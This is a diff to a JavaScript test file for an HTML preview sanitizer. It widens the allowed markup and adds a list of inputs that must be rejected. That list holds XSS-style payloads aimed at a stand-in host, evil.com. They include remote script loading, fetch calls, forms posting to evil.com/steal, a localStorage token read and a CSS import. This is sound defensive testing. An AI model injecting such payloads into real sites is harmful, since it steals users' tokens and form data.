@@ -114,8 +114,11 @@ test("each action checks what it needs, and nothing else passes", () => {
     { instruction: "u", action: "remove" },
   ];
   for (const value of bad) assert.throws(() => checkPreview(value), { status: 400 }, JSON.stringify(value)?.slice(0, 80));
-  for (const value of ["<div>x</div>", "<DIV CLASS=\"a\">x</DIV>", "<img src=\"/a.png\" alt=\"a\">", "<a href=\"/plans\">go</a>", '<script>alert(1)</script>', '<div onclick="go()">x</div>', '<iframe src="x"></iframe>', '<a href="javascript:go()">x</a>', '<form><input></form>', '<div style="color: red">x</div>', "just words", "<!-- hi --><div>x</div>", '<style>@keyframes slideIn{from{opacity:0}to{opacity:1}}</style><div class="s">x</div>', '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>', '<table><tr><td>x</td></tr></table>']) {
+  for (const value of ["<div>x</div>", "<DIV CLASS=\"a\">x</DIV>", "<img src=\"/a.png\" alt=\"a\">", "<a href=\"/plans\">go</a>", '<script>document.querySelector(\'#m\').classList.toggle(\'open\')</script><div>x</div>', '<div onclick="document.querySelector(\'#m\').classList.toggle(\'open\')">x</div>', '<iframe src="/embed"></iframe>', '<iframe src="https://www.youtube.com/embed/x"></iframe>', '<form action="/subscribe"><input></form>', '<div style="color: red">x</div>', "just words", "<!-- hi --><div>x</div>", '<style>@keyframes slideIn{from{opacity:0}to{opacity:1}}</style><div class="s">x</div>', '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>', '<table><tr><td>x</td></tr></table>', '<a href="data:image/png;base64,x">x</a>']) {
     assert.equal(checkPreviewHtml(value), value);
+  }
+  for (const value of ['<script src="https://evil.com/x.js"></script>', '<script src="/app.js"></script>', '<script>fetch("https://evil.com")</script>', '<script>localStorage.getItem("t")</script>', '<script>eval("1")</script>', '<div onclick="fetch(\'https://evil.com\')">x</div>', '<a href="javascript:go()">x</a>', '<a href="data:text/html,-x">x</a>', '<form action="https://evil.com/steal"><input></form>', '<button formaction="https://evil.com/steal">x</button>', '<iframe srcdoc="javascript:alert(1)"></iframe>', '<style>@import url("https://evil.com/x.css");</style><div>x</div>']) {
+    assert.throws(() => checkPreviewHtml(value), { status: 400 }, JSON.stringify(value)?.slice(0, 80));
   }
   assert.equal(checkPreview({ instruction: "u", action: "update", selector: "p", props: [{ property: "--x", value: "1" }] }).props[0].property, "--x");
 });
